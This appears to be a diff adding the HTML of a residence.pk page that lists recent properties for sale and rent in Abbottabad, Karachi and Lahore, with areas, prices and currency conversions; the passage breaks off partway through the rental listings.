+<tr>
+<td valign="top" class="contentContainer">
+
+<h1>Recent Property For Sale in Pakistan</h1>
+ <table align="center" width="830">
+  <tr>
+  
+  <td colspan="2" align="left" style="padding:16px">
+  <table border = "0">
+  
+<td width="10"></td><td>
+  <table bgcolor="#FFFFFF" width="350" border="0" cellspacing="0" cellpadding="0">
+              <tr>
+                <td width="140" rowspan="5" class="thumbs01" align="center" valign="middle"><a href="Property/Abbottabad-near-ilyasi-masjid-nawansher-a-Commercial-Commercial Land-For-Sale-2919.htm"><img src="images/houseLogo.jpg" width="110" height="84" alt="Commercial Land" name="Commercial Land"/></a></td>
+                <td align="right" class="hdng1">Commercial Land</td>
+                <td colspan="2" align="center" class="texthdng"><div class="buttonwrapper"><a href="http://www.residence.pk/Property/Abbottabad--commercial-Commercial Land-For-Sale-2919.htm" class="ovalbuttons"><span>Details</span></a></div></td>
+                </tr>
+              <tr>
+                <td width="83" align="right" valign="middle"><span class="label01">Type</span></td>
+                <td width="1" align="center" valign="middle"></td>
+                <td width="126" align="left" valign="middle">Commercial</td>
+              </tr>
+              <tr>
+                <td align="right" valign="middle"><span class="label01">Area</span></td>
+                <td align="center" valign="middle"></td>
+                <td align="left" valign="middle">16 - Marla <a href="#" onMouseOver="showContent(event, 'areaDivR0')" onMouseMove="moveContent(event, 'areaDivR0')" onMouseOut="hideContent('areaDivR0')" ><img src="images/info.gif" /></a>
+                <div id="areaDivR0" style="position:absolute; z-index:100;top:0px;left:400px; display:none; filter:alpha(opacity=80);-moz-opacity:1;opacity:1;"> 
+												<table bgcolor="#EEEEEE" style="border: 1px solid #BBBBBB"><tr> 
+												  <td>0.8</td><td> Kanal</td> </tr> <tr> <td>16</td> <td>Marla</td></tr><tr><td>3600</td><td> Sq.Feet</td></tr><tr><td>484</td> <td>Sq.Yards</td> </tr>
+													
+											
+													</table> 
+											
+												</div></td>
+              </tr>
+              <tr>
+                <td align="right" valign="middle"><span class="label01">City</span></td>
+                <td align="center" valign="middle"></td>
+                <td align="left" valign="middle">Abbottabad</td>
+              </tr>
+              <tr>
+                <td align="right" valign="middle"><span class="label01">Demand</span></td>
+                <td align="center" valign="middle"></td>
+                <td align="left" valign="middle">Rs. 6720000/-<a href="#" onMouseOver="showContent(event, 'priceDivR0')" onMouseMove="moveContent(event, 'priceDivR0')" onMouseOut="hideContent('priceDivR0')" > <img src="images/info.gif" /></a>
+                <div id="priceDivR0" style="position:absolute; z-index:100;top:0px;left:400px; display:none; filter:alpha(opacity=80);-moz-opacity:1;opacity:1;"> 
+												<table bgcolor="#EEEEEE" style="border: 1px solid #BBBBBB"><tr> 
+												  <td>64000 GBP<br />78413 USD<br />51891 Euro</td> 
+													</tr> 
+											
+													</table> 
+											
+												</div></td>
+              </tr>
+              <tr>
+                <td colspan="2" align="right" valign="middle"><span class="label01"></span></td>
+                <td align="left" valign="middle"></td>
+                <td align="left" valign="middle" style="color:#666; font-size:10px"><div id="costInWords1"></div><script>getCost('6720000', 'costInWords1');</script></td>
+              </tr>
+              
+     </table>
+	 </td>
+	
+	 
+	 
+<td width="10"></td><td>
+  <table bgcolor="#FFFFFF" width="350" border="0" cellspacing="0" cellpadding="0">
+              <tr>
+                <td width="140" rowspan="5" class="thumbs01" align="center" valign="middle"><a href="Property/Abbottabad-main-iqbal-road-Residential-House-For-Sale-2918.htm"><img src="images/houseLogo.jpg" width="110" height="84" alt="House" name="House"/></a></td>
+                <td align="right" class="hdng1">House</td>
+                <td colspan="2" align="center" class="texthdng"><div class="buttonwrapper"><a href="http://www.residence.pk/Property/Abbottabad--residential-House-For-Sale-2918.htm" class="ovalbuttons"><span>Details</span></a></div></td>
+                </tr>
+              <tr>
+                <td width="83" align="right" valign="middle"><span class="label01">Type</span></td>
+                <td width="1" align="center" valign="middle"></td>
+                <td width="126" align="left" valign="middle">Residential</td>
+              </tr>
+              <tr>
+                <td align="right" valign="middle"><span class="label01">Area</span></td>
+                <td align="center" valign="middle"></td>
+                <td align="left" valign="middle">20 - Marla <a href="#" onMouseOver="showContent(event, 'areaDivR1')" onMouseMove="moveContent(event, 'areaDivR1')" onMouseOut="hideContent('areaDivR1')" ><img src="images/info.gif" /></a>
+                <div id="areaDivR1" style="position:absolute; z-index:100;top:0px;left:400px; display:none; filter:alpha(opacity=80);-moz-opacity:1;opacity:1;"> 
+												<table bgcolor="#EEEEEE" style="border: 1px solid #BBBBBB"><tr> 
+												  <td>1</td><td> Kanal</td> </tr> <tr> <td>20</td> <td>Marla</td></tr><tr><td>4500</td><td> Sq.Feet</td></tr><tr><td>605</td> <td>Sq.Yards</td> </tr>
+													
+											
+													</table> 
+											
+												</div></td>
+              </tr>
+              <tr>
+                <td align="right" valign="middle"><span class="label01">City</span></td>
+                <td align="center" valign="middle"></td>
+                <td align="left" valign="middle">Abbottabad</td>
+              </tr>
+              <tr>
+                <td align="right" valign="middle"><span class="label01">Demand</span></td>
+                <td align="center" valign="middle"></td>
+                <td align="left" valign="middle">Rs. 12000000/-<a href="#" onMouseOver="showContent(event, 'priceDivR1')" onMouseMove="moveContent(event, 'priceDivR1')" onMouseOut="hideContent('priceDivR1')" > <img src="images/info.gif" /></a>
+                <div id="priceDivR1" style="position:absolute; z-index:100;top:0px;left:400px; display:none; filter:alpha(opacity=80);-moz-opacity:1;opacity:1;"> 
+												<table bgcolor="#EEEEEE" style="border: 1px solid #BBBBBB"><tr> 
+												  <td>114285 GBP<br />140023 USD<br />92664 Euro</td> 
+													</tr> 
+											
+													</table> 
+											
+												</div></td>
+              </tr>
+              <tr>
+                <td colspan="2" align="right" valign="middle"><span class="label01"></span></td>
+                <td align="left" valign="middle"></td>
+                <td align="left" valign="middle" style="color:#666; font-size:10px"><div id="costInWords2"></div><script>getCost('12000000', 'costInWords2');</script></td>
+              </tr>
+              
+     </table>
+	 </td>
+	
+	 
+	 </tr>
+<td width="10"></td><td>
+  <table bgcolor="#FFFFFF" width="350" border="0" cellspacing="0" cellpadding="0">
+              <tr>
+                <td width="140" rowspan="5" class="thumbs01" align="center" valign="middle"><a href="Property/Other-No-Preference-Commercial-Building-For-Sale-2917.htm"><img src="uploads/2917_front.jpg.thumb.jpg" width="110" height="84" alt="Building" name="Building"/></a></td>
+                <td align="right" class="hdng1">Building</td>
+                <td colspan="2" align="center" class="texthdng"><div class="buttonwrapper"><a href="http://www.residence.pk/Property/Other-No Preference-Commercial-Building-For-Sale-2917.htm" class="ovalbuttons"><span>Details</span></a></div></td>
+                </tr>
+              <tr>
+                <td width="83" align="right" valign="middle"><span class="label01">Type</span></td>
+                <td width="1" align="center" valign="middle"></td>
+                <td width="126" align="left" valign="middle">Commercial</td>
+              </tr>
+              <tr>
+                <td align="right" valign="middle"><span class="label01">Area</span></td>
+                <td align="center" valign="middle"></td>
+                <td align="left" valign="middle">3.3 - Kanal <a href="#" onMouseOver="showContent(event, 'areaDivR2')" onMouseMove="moveContent(event, 'areaDivR2')" onMouseOut="hideContent('areaDivR2')" ><img src="images/info.gif" /></a>
+                <div id="areaDivR2" style="position:absolute; z-index:100;top:0px;left:400px; display:none; filter:alpha(opacity=80);-moz-opacity:1;opacity:1;"> 
+												<table bgcolor="#EEEEEE" style="border: 1px solid #BBBBBB"><tr> 
+												  <td>3.3</td><td> Kanal</td> </tr> <tr> <td>66</td> <td>Marla</td></tr><tr><td>14850</td><td> Sq.Feet</td></tr><tr><td>1996.</td> <td>Sq.Yards</td> </tr>
+													
+											
+													</table> 
+											
+												</div></td>
+              </tr>
+              <tr>
+                <td align="right" valign="middle"><span class="label01">City</span></td>
+                <td align="center" valign="middle"></td>
+                <td align="left" valign="middle">Other</td>
+              </tr>
+              <tr>
+                <td align="right" valign="middle"><span class="label01">Demand</span></td>
+                <td align="center" valign="middle"></td>
+                <td align="left" valign="middle">Rs. 60000000/-<a href="#" onMouseOver="showContent(event, 'priceDivR2')" onMouseMove="moveContent(event, 'priceDivR2')" onMouseOut="hideContent('priceDivR2')" > <img src="images/info.gif" /></a>
+                <div id="priceDivR2" style="position:absolute; z-index:100;top:0px;left:400px; display:none; filter:alpha(opacity=80);-moz-opacity:1;opacity:1;"> 
+												<table bgcolor="#EEEEEE" style="border: 1px solid #BBBBBB"><tr> 
+												  <td>571428 GBP<br />700116 USD<br />463320 Euro</td> 
+													</tr> 
+											
+													</table> 
+											
+												</div></td>
+              </tr>
+              <tr>
+                <td colspan="2" align="right" valign="middle"><span class="label01"></span></td>
+                <td align="left" valign="middle"></td>
+                <td align="left" valign="middle" style="color:#666; font-size:10px"><div id="costInWords3"></div><script>getCost('60000000', 'costInWords3');</script></td>
+              </tr>
+              
+     </table>
+	 </td>
+	
+	 
+	 
+<td width="10"></td><td>
+  <table bgcolor="#FFFFFF" width="350" border="0" cellspacing="0" cellpadding="0">
+              <tr>
+                <td width="140" rowspan="5" class="thumbs01" align="center" valign="middle"><a href="Property/Karachi-Korangi-Residential-Plot-For-Sale-2916.htm"><img src="uploads/2916_front.jpg.thumb.jpg" width="110" height="84" alt="Plot" name="Plot"/></a></td>
+                <td align="right" class="hdng1">Plot</td>
+                <td colspan="2" align="center" class="texthdng"><div class="buttonwrapper"><a href="http://www.residence.pk/Property/Karachi-Korangi-Residential-Plot-For-Sale-2916.htm" class="ovalbuttons"><span>Details</span></a></div></td>
+                </tr>
+              <tr>
+                <td width="83" align="right" valign="middle"><span class="label01">Type</span></td>
+                <td width="1" align="center" valign="middle"></td>
+                <td width="126" align="left" valign="middle">Residential</td>
+              </tr>
+              <tr>
+                <td align="right" valign="middle"><span class="label01">Area</span></td>
+                <td align="center" valign="middle"></td>
+                <td align="left" valign="middle">112 - Sq.Yards <a href="#" onMouseOver="showContent(event, 'areaDivR3')" onMouseMove="moveContent(event, 'areaDivR3')" onMouseOut="hideContent('areaDivR3')" ><img src="images/info.gif" /></a>
+                <div id="areaDivR3" style="position:absolute; z-index:100;top:0px;left:400px; display:none; filter:alpha(opacity=80);-moz-opacity:1;opacity:1;"> 
+												<table bgcolor="#EEEEEE" style="border: 1px solid #BBBBBB"><tr> 
+												  <td>0.18</td><td> Kanal</td> </tr> <tr> <td>3.70</td> <td>Marla</td></tr><tr><td>833.0</td><td> Sq.Feet</td></tr><tr><td>112</td> <td>Sq.Yards</td> </tr>
+													
+											
+													</table> 
+											
+												</div></td>
+              </tr>
+              <tr>
+                <td align="right" valign="middle"><span class="label01">City</span></td>
+                <td align="center" valign="middle"></td>
+                <td align="left" valign="middle">Karachi</td>
+              </tr>
+              <tr>
+                <td align="right" valign="middle"><span class="label01">Demand</span></td>
+                <td align="center" valign="middle"></td>
+                <td align="left" valign="middle">Rs. 5500000/-<a href="#" onMouseOver="showContent(event, 'priceDivR3')" onMouseMove="moveContent(event, 'priceDivR3')" onMouseOut="hideContent('priceDivR3')" > <img src="images/info.gif" /></a>
+                <div id="priceDivR3" style="position:absolute; z-index:100;top:0px;left:400px; display:none; filter:alpha(opacity=80);-moz-opacity:1;opacity:1;"> 
+												<table bgcolor="#EEEEEE" style="border: 1px solid #BBBBBB"><tr> 
+												  <td>52380 GBP<br />64177 USD<br />42471 Euro</td> 
+													</tr> 
+											
+													</table> 
+											
+												</div></td>
+              </tr>
+              <tr>
+                <td colspan="2" align="right" valign="middle"><span class="label01"></span></td>
+                <td align="left" valign="middle"></td>
+                <td align="left" valign="middle" style="color:#666; font-size:10px"><div id="costInWords4"></div><script>getCost('5500000', 'costInWords4');</script></td>
+              </tr>
+              
+     </table>
+	 </td>
+	
+	 
+	 </tr>
+<td width="10"></td><td>
+  <table bgcolor="#FFFFFF" width="350" border="0" cellspacing="0" cellpadding="0">
+              <tr>
+                <td width="140" rowspan="5" class="thumbs01" align="center" valign="middle"><a href="Property/Karachi-Korangi-Residential-House-For-Sale-2915.htm"><img src="uploads/2915_front.jpg.thumb.jpg" width="110" height="84" alt="House" name="House"/></a></td>
+                <td align="right" class="hdng1">House</td>
+                <td colspan="2" align="center" class="texthdng"><div class="buttonwrapper"><a href="http://www.residence.pk/Property/Karachi-Korangi-Residential-House-For-Sale-2915.htm" class="ovalbuttons"><span>Details</span></a></div></td>
+                </tr>
+              <tr>
+                <td width="83" align="right" valign="middle"><span class="label01">Type</span></td>
+                <td width="1" align="center" valign="middle"></td>
+                <td width="126" align="left" valign="middle">Residential</td>
+              </tr>
+              <tr>
+                <td align="right" valign="middle"><span class="label01">Area</span></td>
+                <td align="center" valign="middle"></td>
+                <td align="left" valign="middle">533 - Sq.Yards <a href="#" onMouseOver="showContent(event, 'areaDivR4')" onMouseMove="moveContent(event, 'areaDivR4')" onMouseOut="hideContent('areaDivR4')" ><img src="images/info.gif" /></a>
+                <div id="areaDivR4" style="position:absolute; z-index:100;top:0px;left:400px; display:none; filter:alpha(opacity=80);-moz-opacity:1;opacity:1;"> 
+												<table bgcolor="#EEEEEE" style="border: 1px solid #BBBBBB"><tr> 
+												  <td>0.88</td><td> Kanal</td> </tr> <tr> <td>17.6</td> <td>Marla</td></tr><tr><td>3964.</td><td> Sq.Feet</td></tr><tr><td>533</td> <td>Sq.Yards</td> </tr>
+													
+											
+													</table> 
+											
+												</div></td>
+              </tr>
+              <tr>
+                <td align="right" valign="middle"><span class="label01">City</span></td>
+                <td align="center" valign="middle"></td>
+                <td align="left" valign="middle">Karachi</td>
+              </tr>
+              <tr>
+                <td align="right" valign="middle"><span class="label01">Demand</span></td>
+                <td align="center" valign="middle"></td>
+                <td align="left" valign="middle">Rs. 19000000/-<a href="#" onMouseOver="showContent(event, 'priceDivR4')" onMouseMove="moveContent(event, 'priceDivR4')" onMouseOut="hideContent('priceDivR4')" > <img src="images/info.gif" /></a>
+                <div id="priceDivR4" style="position:absolute; z-index:100;top:0px;left:400px; display:none; filter:alpha(opacity=80);-moz-opacity:1;opacity:1;"> 
+												<table bgcolor="#EEEEEE" style="border: 1px solid #BBBBBB"><tr> 
+												  <td>180952 GBP<br />221703 USD<br />146718 Euro</td> 
+													</tr> 
+											
+													</table> 
+											
+												</div></td>
+              </tr>
+              <tr>
+                <td colspan="2" align="right" valign="middle"><span class="label01"></span></td>
+                <td align="left" valign="middle"></td>
+                <td align="left" valign="middle" style="color:#666; font-size:10px"><div id="costInWords5"></div><script>getCost('19000000', 'costInWords5');</script></td>
+              </tr>
+              
+     </table>
+	 </td>
+	
+	 
+	 
+<td width="10"></td><td>
+  <table bgcolor="#FFFFFF" width="350" border="0" cellspacing="0" cellpadding="0">
+              <tr>
+                <td width="140" rowspan="5" class="thumbs01" align="center" valign="middle"><a href="Property/Lahore-Johar-Town-Residential-House-For-Sale-2914.htm"><img src="images/houseLogo.jpg" width="110" height="84" alt="House" name="House"/></a></td>
+                <td align="right" class="hdng1">House</td>
+                <td colspan="2" align="center" class="texthdng"><div class="buttonwrapper"><a href="http://www.residence.pk/Property/Lahore-Johar Town-residential-House-For-Sale-2914.htm" class="ovalbuttons"><span>Details</span></a></div></td>
+                </tr>
+              <tr>
+                <td width="83" align="right" valign="middle"><span class="label01">Type</span></td>
+                <td width="1" align="center" valign="middle"></td>
+                <td width="126" align="left" valign="middle">Residential</td>
+              </tr>
+              <tr>
+                <td align="right" valign="middle"><span class="label01">Area</span></td>
+                <td align="center" valign="middle"></td>
+                <td align="left" valign="middle">7.5 - Marla <a href="#" onMouseOver="showContent(event, 'areaDivR5')" onMouseMove="moveContent(event, 'areaDivR5')" onMouseOut="hideContent('areaDivR5')" ><img src="images/info.gif" /></a>
+                <div id="areaDivR5" style="position:absolute; z-index:100;top:0px;left:400px; display:none; filter:alpha(opacity=80);-moz-opacity:1;opacity:1;"> 
+												<table bgcolor="#EEEEEE" style="border: 1px solid #BBBBBB"><tr> 
+												  <td>0.37</td><td> Kanal</td> </tr> <tr> <td>7.5</td> <td>Marla</td></tr><tr><td>1687.</td><td> Sq.Feet</td></tr><tr><td>226.8</td> <td>Sq.Yards</td> </tr>
+													
+											
+													</table> 
+											
+												</div></td>
+              </tr>
+              <tr>
+                <td align="right" valign="middle"><span class="label01">City</span></td>
+                <td align="center" valign="middle"></td>
+                <td align="left" valign="middle">Lahore</td>
+              </tr>
+              <tr>
+                <td align="right" valign="middle"><span class="label01">Demand</span></td>
+                <td align="center" valign="middle"></td>
+                <td align="left" valign="middle">Rs. 12500000/-<a href="#" onMouseOver="showContent(event, 'priceDivR5')" onMouseMove="moveContent(event, 'priceDivR5')" onMouseOut="hideContent('priceDivR5')" > <img src="images/info.gif" /></a>
+                <div id="priceDivR5" style="position:absolute; z-index:100;top:0px;left:400px; display:none; filter:alpha(opacity=80);-moz-opacity:1;opacity:1;"> 
+												<table bgcolor="#EEEEEE" style="border: 1px solid #BBBBBB"><tr> 
+												  <td>119047 GBP<br />145857 USD<br />96525 Euro</td> 
+													</tr> 
+											
+													</table> 
+											
+												</div></td>
+              </tr>
+              <tr>
+                <td colspan="2" align="right" valign="middle"><span class="label01"></span></td>
+                <td align="left" valign="middle"></td>
+                <td align="left" valign="middle" style="color:#666; font-size:10px"><div id="costInWords6"></div><script>getCost('12500000', 'costInWords6');</script></td>
+              </tr>
+              
+     </table>
+	 </td>
+	
+	 
+	 </tr>
+<td width="10"></td><td>
+  <table bgcolor="#FFFFFF" width="350" border="0" cellspacing="0" cellpadding="0">
+              <tr>
+                <td width="140" rowspan="5" class="thumbs01" align="center" valign="middle"><a href="Property/Karachi-D.H.A-Residential-House-For-Sale-2913.htm"><img src="images/houseLogo.jpg" width="110" height="84" alt="House" name="House"/></a></td>
+                <td align="right" class="hdng1">House</td>
+                <td colspan="2" align="center" class="texthdng"><div class="buttonwrapper"><a href="http://www.residence.pk/Property/Karachi-D.H.A-residential-House-For-Sale-2913.htm" class="ovalbuttons"><span>Details</span></a></div></td>
+                </tr>
+              <tr>
+                <td width="83" align="right" valign="middle"><span class="label01">Type</span></td>
+                <td width="1" align="center" valign="middle"></td>
+                <td width="126" align="left" valign="middle">Residential</td>
+              </tr>
+              <tr>
+                <td align="right" valign="middle"><span class="label01">Area</span></td>
+                <td align="center" valign="middle"></td>
+                <td align="left" valign="middle">1900 - Sq.Feet <a href="#" onMouseOver="showContent(event, 'areaDivR6')" onMouseMove="moveContent(event, 'areaDivR6')" onMouseOut="hideContent('areaDivR6')" ><img src="images/info.gif" /></a>
+                <div id="areaDivR6" style="position:absolute; z-index:100;top:0px;left:400px; display:none; filter:alpha(opacity=80);-moz-opacity:1;opacity:1;"> 
+												<table bgcolor="#EEEEEE" style="border: 1px solid #BBBBBB"><tr> 
+												  <td>0.42</td><td> Kanal</td> </tr> <tr> <td>8.44</td> <td>Marla</td></tr><tr><td>1900</td><td> Sq.Feet</td></tr><tr><td>62.80</td> <td>Sq.Yards</td> </tr>
+													
+											
+													</table> 
+											
+												</div></td>
+              </tr>
+              <tr>
+                <td align="right" valign="middle"><span class="label01">City</span></td>
+                <td align="center" valign="middle"></td>
+                <td align="left" valign="middle">Karachi</td>
+              </tr>
+              <tr>
+                <td align="right" valign="middle"><span class="label01">Demand</span></td>
+                <td align="center" valign="middle"></td>
+                <td align="left" valign="middle">Rs. 16500000/-<a href="#" onMouseOver="showContent(event, 'priceDivR6')" onMouseMove="moveContent(event, 'priceDivR6')" onMouseOut="hideContent('priceDivR6')" > <img src="images/info.gif" /></a>
+                <div id="priceDivR6" style="position:absolute; z-index:100;top:0px;left:400px; display:none; filter:alpha(opacity=80);-moz-opacity:1;opacity:1;"> 
+												<table bgcolor="#EEEEEE" style="border: 1px solid #BBBBBB"><tr> 
+												  <td>157142 GBP<br />192532 USD<br />127413 Euro</td> 
+													</tr> 
+											
+													</table> 
+											
+												</div></td>
+              </tr>
+              <tr>
+                <td colspan="2" align="right" valign="middle"><span class="label01"></span></td>
+                <td align="left" valign="middle"></td>
+                <td align="left" valign="middle" style="color:#666; font-size:10px"><div id="costInWords7"></div><script>getCost('16500000', 'costInWords7');</script></td>
+              </tr>
+              
+     </table>
+	 </td>
+	
+	 
+	 
+<td width="10"></td><td>
+  <table bgcolor="#FFFFFF" width="350" border="0" cellspacing="0" cellpadding="0">
+              <tr>
+                <td width="140" rowspan="5" class="thumbs01" align="center" valign="middle"><a href="Property/Karachi-D.H.A-Residential-House-For-Sale-2912.htm"><img src="uploads/2912_front.jpg.thumb.jpg" width="110" height="84" alt="House" name="House"/></a></td>
+                <td align="right" class="hdng1">House</td>
+                <td colspan="2" align="center" class="texthdng"><div class="buttonwrapper"><a href="http://www.residence.pk/Property/Karachi-D.H.A-Residential-House-For-Sale-2912.htm" class="ovalbuttons"><span>Details</span></a></div></td>
+                </tr>
+              <tr>
+                <td width="83" align="right" valign="middle"><span class="label01">Type</span></td>
+                <td width="1" align="center" valign="middle"></td>
+                <td width="126" align="left" valign="middle">Residential</td>
+              </tr>
+              <tr>
+                <td align="right" valign="middle"><span class="label01">Area</span></td>
+                <td align="center" valign="middle"></td>
+                <td align="left" valign="middle">1000 - Sq.Yards <a href="#" onMouseOver="showContent(event, 'areaDivR7')" onMouseMove="moveContent(event, 'areaDivR7')" onMouseOut="hideContent('areaDivR7')" ><img src="images/info.gif" /></a>
+                <div id="areaDivR7" style="position:absolute; z-index:100;top:0px;left:400px; display:none; filter:alpha(opacity=80);-moz-opacity:1;opacity:1;"> 
+												<table bgcolor="#EEEEEE" style="border: 1px solid #BBBBBB"><tr> 
+												  <td>1.65</td><td> Kanal</td> </tr> <tr> <td>33.0</td> <td>Marla</td></tr><tr><td>7438</td><td> Sq.Feet</td></tr><tr><td>1000</td> <td>Sq.Yards</td> </tr>
+													
+											
+													</table> 
+											
+												</div></td>
+              </tr>
+              <tr>
+                <td align="right" valign="middle"><span class="label01">City</span></td>
+                <td align="center" valign="middle"></td>
+                <td align="left" valign="middle">Karachi</td>
+              </tr>
+              <tr>
+                <td align="right" valign="middle"><span class="label01">Demand</span></td>
+                <td align="center" valign="middle"></td>
+                <td align="left" valign="middle">Rs. 90000000/-<a href="#" onMouseOver="showContent(event, 'priceDivR7')" onMouseMove="moveContent(event, 'priceDivR7')" onMouseOut="hideContent('priceDivR7')" > <img src="images/info.gif" /></a>
+                <div id="priceDivR7" style="position:absolute; z-index:100;top:0px;left:400px; display:none; filter:alpha(opacity=80);-moz-opacity:1;opacity:1;"> 
+												<table bgcolor="#EEEEEE" style="border: 1px solid #BBBBBB"><tr> 
+												  <td>857142 GBP<br />1050175 USD<br />694980 Euro</td> 
+													</tr> 
+											
+													</table> 
+											
+												</div></td>
+              </tr>
+              <tr>
+                <td colspan="2" align="right" valign="middle"><span class="label01"></span></td>
+                <td align="left" valign="middle"></td>
+                <td align="left" valign="middle" style="color:#666; font-size:10px"><div id="costInWords8"></div><script>getCost('90000000', 'costInWords8');</script></td>
+              </tr>
+              
+     </table>
+	 </td>
+	
+	 
+	 </tr>    </table>
+  </td>
+  </tr>   
+  <tr>
+  <td align="left"  >&nbsp;&nbsp;<a title="Sell my property" href="sell_property_pakistan.php">I want to sell my property</a>
+  
+  </td>
+  <td align="right" ><a href="buy-property.php">Show All Property for Sale</a>&nbsp;&nbsp;</td>
+  </tr>
+  <tr>
+   
+  </tr>
+</table>
+</td>
+<td class="contentContainer" width="160" valign="top" align="center">
+<p class="pTitle">Advertisements</p>
+<!--<a href="http://www.careerconnect.pk/" title="Jobs in Pakistan"><img src="http://www.residence.pk/images/banner_cc_ad_160x600.jpg" />
+</a>-->
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- residence_sidebar -->
+<ins class="adsbygoogle"
+     style="display:inline-block;width:160px;height:600px"
+     data-ad-client="ca-pub-3372467704838104"
+     data-ad-slot="6642216099"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script></td></tr></table>
+    
+    
+<table width="1000" height="540" align="center">
+<tr>
+<td valign="top" class="contentContainer">
+
+<h1>Recent Property For Rent in Pakistan</h1>
+
+  <table align="center" width="830">
+  <tr><td colspan="2">
+  <table border = "0">
+  
+<td width="10"></td><td>
+  <table bgcolor="#FFFFFF" width="350" border="0" cellspacing="0" cellpadding="0">
+              <tr>
+                <td width="140" rowspan="5" class="thumbs01" align="center" valign="middle"><a href="http://www.residence.pk/Rentals/Abbottabad-No Preference-commercial-Other-For-Rent-2216.htm"><img src="uploads_rent/2216_side.jpg.thumb.jpg" width="110" height="84" alt="Other" name="Other"/></a></td>
+                <td align="right" class="hdng1">Other</td>
+                <td colspan="2" align="center" class="texthdng"><div class="buttonwrapper"><a href="http://www.residence.pk/Rentals/Abbottabad-No Preference-commercial-Other-For-Rent-2216.htm" class="ovalbuttons"><span>Details</span></a></div></td>
+                </tr>
+              <tr>
+                <td width="83" align="right" valign="middle"><span class="label01">Type</span></td>
+                <td width="1" align="center" valign="middle"></td>
+                <td width="126" align="left" valign="middle">Commercial</td>
+              </tr>
+              <tr>
+                <td align="right" valign="middle"><span class="label01">Area</span></td>
+                <td align="center" valign="middle"></td>
+                <td align="left" valign="middle">2 - Kanal <a href="#" onMouseOver="showContent(event, 'areaDivb1')" onMouseMove="moveContent(event, 'areaDivb1')" onMouseOut="hideContent('areaDivb1')" ><img src="images/info.gif" /></a>
+                <div id="areaDivb1" style="position:absolute; z-index:100;top:0px;left:400px; display:none; filter:alpha(opacity=80);-moz-opacity:1;opacity:1;"> 
+												<table bgcolor="#EEEEEE" style="border: 1px solid #BBBBBB"><tr> 
+												  <td>2</td><td> Kanal</td> </tr> <tr> <td>40</td> <td>Marla</td></tr><tr><td>9000</td><td> Sq.Feet</td></tr><tr><td>1210</td> <td>Sq.Yards</td> </tr>
+													
+											
+													</table> 
+											
+												</div></td>
+              </tr>
+              <tr>
+                <td align="right" valign="middle"><span class="label01">City</span></td>
+                <td align="center" valign="middle"></td>
+                <td align="left" valign="middle">Abbottabad</td>
+              </tr>
+              <tr>
+                <td align="right" valign="middle"><span class="label01">Rent</span></td>
+                <td align="center" valign="middle"></td>
+                <td align="left" valign="middle">Rs. 118000/-<a href="#" onMouseOver="showContent(event, 'priceDivb1')" onMouseMove="moveContent(event, 'priceDivb1')" onMouseOut="hideContent('priceDivb1')" > <img src="images/info.gif" /></a>
+                <div id="priceDivb1" style="position:absolute; z-index:100;top:0px;left:400px; display:none; filter:alpha(opacity=80);-moz-opacity:1;opacity:1;"> 
+												<table bgcolor="#EEEEEE" style="border: 1px solid #BBBBBB"><tr> 
+												  <td>1123 GBP<br />1376 USD<br />911 Euro</td> 
+													</tr> 
+											
+													</table> 
+											
+												</div>
+                </td>
+                 
+              </tr>
+              <tr>
+                <td colspan="2" align="right" valign="middle"><span class="label01"></span></td>
+                <td align="left" valign="middle"></td>
+                <td align="left" valign="middle" style="color:#666; font-size:10px"><div id="costInWordsb1"></div><script>getCost('118000', 'costInWordsb1');</script></td>
+              </tr>
+              
+     </table>
+	 </td>
+	
+	 
+	 
+<td width="10"></td><td>
+  <table bgcolor="#FFFFFF" width="350" border="0" cellspacing="0" cellpadding="0">
+              <tr>
+                <td width="140" rowspan="5" class="thumbs01" align="center" valign="middle"><a href="http://www.residence.pk/Rentals/Abbottabad--residential-House-For-Rent-2212.htm"><img src="images/houseLogo.jpg" width="110" height="84" alt="House" name="House"/></a></td>
+                <td align="right" class="hdng1">House</td>
+                <td colspan="2" align="center" class="texthdng"><div class="buttonwrapper"><a href="http://www.residence.pk/Rentals/Abbottabad--residential-House-For-Rent-2212.htm" class="ovalbuttons"><span>Details</span></a></div></td>
+                </tr>
+              <tr>
+                <td width="83" align="right" valign="middle"><span class="label01">Type</span></td>
+                <td width="1" align="center" valign="middle"></td>
+                <td width="126" align="left" valign="middle">Residential</td>
+              </tr>
+              <tr>
+                <td align="right" valign="middle"><span class="label01">Area</span></td>
+                <td align="center" valign="middle"></td>
+                <td align="left" valign="middle">500 - Marla <a href="#" onMouseOver="showContent(event, 'areaDivb2')" onMouseMove="moveContent(event, 'areaDivb2')" onMouseOut="hideContent('areaDivb2')" ><img src="images/info.gif" /></a>
+                <div id="areaDivb2" style="position:absolute; z-index:100;top:0px;left:400px; display:none; filter:alpha(opacity=80);-moz-opacity:1;opacity:1;"> 
+												<table bgcolor="#EEEEEE" style="border: 1px solid #BBBBBB"><tr> 
+												  <td>25</td><td> Kanal</td> </tr> <tr> <td>500</td> <td>Marla</td></tr><tr><td>11250</td><td> Sq.Feet</td></tr><tr><td>15125</td> <td>Sq.Yards</td> </tr>
+													
+											
+													</table> 
+											
+												</div></td>
+              </tr>
+              <tr>
+                <td align="right" valign="middle"><span class="label01">City</span></td>
+                <td align="center" valign="middle"></td>
+                <td align="left" valign="middle">Abbottabad</td>
+              </tr>
+              <tr>
+                <td align="right" valign="middle"><span class="label01">Rent</span></td>
+                <td align="center" valign="middle"></td>
+                <td align="left" valign="middle">Rs. 20000/-<a href="#" onMouseOver="showContent(event, 'priceDivb2')" onMouseMove="moveContent(event, 'priceDivb2')" onMouseOut="hideContent('priceDivb2')" > <img src="images/info.gif" /></a>
+                <div id="priceDivb2" style="position:absolute; z-index:100;top:0px;left:400px; display:none; filter:alpha(opacity=80);-moz-opacity:1;opacity:1;"> 
+												<table bgcolor="#EEEEEE" style="border: 1px solid #BBBBBB"><tr> 
+												  <td>190 GBP<br />233 USD<br />154 Euro</td> 
+													</tr> 
+											
+													</table> 
+											
+												</div>
+                </td>
+                 
+              </tr>
+              <tr>
+                <td colspan="2" align="right" valign="middle"><span class="label01"></span></td>
+                <td align="left" valign="middle"></td>
+                <td align="left" valign="middle" style="color:#666; font-size:10px"><div id="costInWordsb2"></div><script>getCost('20000', 'costInWordsb2');</script></td>
+              </tr>
+              
+     </table>
+	 </td>
+	
+	 
+	 </tr>
+<td width="10"></td><td>
+  <table bgcolor="#FFFFFF" width="350" border="0" cellspacing="0" cellpadding="0">
+              <tr>
